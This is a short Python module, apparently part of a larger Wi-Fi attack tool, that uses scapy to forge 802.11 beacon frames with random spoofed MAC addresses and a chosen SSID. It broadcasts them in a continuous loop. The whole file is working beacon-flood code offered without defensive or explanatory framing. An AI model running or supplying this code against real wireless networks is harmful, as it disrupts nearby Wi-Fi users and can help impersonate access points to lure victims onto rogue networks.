import scapy.all as scapy
import globals
import time 
import threading
class BeaconSpam:
    def __init__(self):
        self.IFACE = globals.interface
        self._stop_event = threading.Event()
    def stop(self):
        self._stop_event.set()
    def build_beacon_packet(self):
        rand_mac = scapy.RandMAC()
        packet = (scapy.RadioTap()/
                  scapy.Dot11(type=0, subtype=8,
                              addr1= "ff:ff:ff:ff:ff:ff",
                              addr2= rand_mac,
                              addr3= rand_mac)/
                    scapy.Dot11Beacon(cap="ESS")/
                    scapy.Dot11Elt(ID = 0, info=globals.selected_ssid, len=len(globals.selected_ssid))/
                    scapy.Dot11Elt(ID = 1, info = (
                        "\x82\x84\x8b\x96"
                    ))/
                    scapy.Dot11Elt(ID = 3, info = bytes([int(globals.channel) if globals.channel else 1])
                    ))
        return packet
    def send_beacon_packet(self):
        while not self._stop_event.is_set():
            try:
                pkt = self.build_beacon_packet()
                scapy.sendp(pkt, iface=self.IFACE, verbose=False)
                time.sleep(0.1)
            except Exception as e:
                print(f"Beacon send error: {e}")
                time.sleep(0.1)